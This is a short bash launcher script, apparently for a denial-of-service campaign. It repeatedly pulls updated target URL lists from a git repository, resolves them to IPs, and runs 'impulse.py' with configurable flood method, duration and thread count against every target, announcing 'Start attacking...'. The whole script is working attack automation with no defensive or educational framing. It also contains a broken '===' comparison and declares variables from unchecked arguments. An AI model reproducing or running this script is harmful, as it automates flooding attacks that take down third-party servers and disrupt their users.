# Create variables from named arguments.
while [ $# -gt 0 ]; do
  if [[ $1 == *"--"* ]]; then
      v="${1/--/}"
      declare $v="$2"
  fi
  shift
done

# Set default values for arguments if missing.
method="${method:-HTTP}" 
time="${time:-50}"
threads="${threads:-20}" 

attack="python3 impulse.py --method ${method} --time ${time} --threads ${threads} --target %"

while true
do
  echo "Get the latest scripts & URLs..."
  git pull --rebase
  # TODO: Do it only once in X minutes.
  echo "Resolving IPs..."
  cat urls | xargs -n1 -I % bash -c 'node ip-lookup.mjs %' > ips
  echo "Done!"
  echo "Start attacking..."
  if [ "$method" === "HTTP" ]; then
    cat urls | xargs -n1 -I % bash -c "${attack}"
  else
    cat ips | xargs -n1 -I % bash -c "${attack}"
  fi

  sleep 1
done
